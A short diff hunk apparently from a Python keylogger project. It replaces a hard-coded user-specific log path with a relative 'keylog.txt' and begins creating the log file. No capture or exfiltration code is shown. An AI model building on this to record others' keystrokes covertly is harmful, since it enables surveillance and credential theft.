@@ -4,7 +4,7 @@ import os
 import time
 
 # Set the log file path and name
-log_file_path = "/Users/deepchandrakar/Desktop/parasunet/keylogger/keylog.txt"
+log_file_path = "keylog.txt"
 
 # Create the log file if it doesn't exist
 if not os.path.exists(log_file_path):
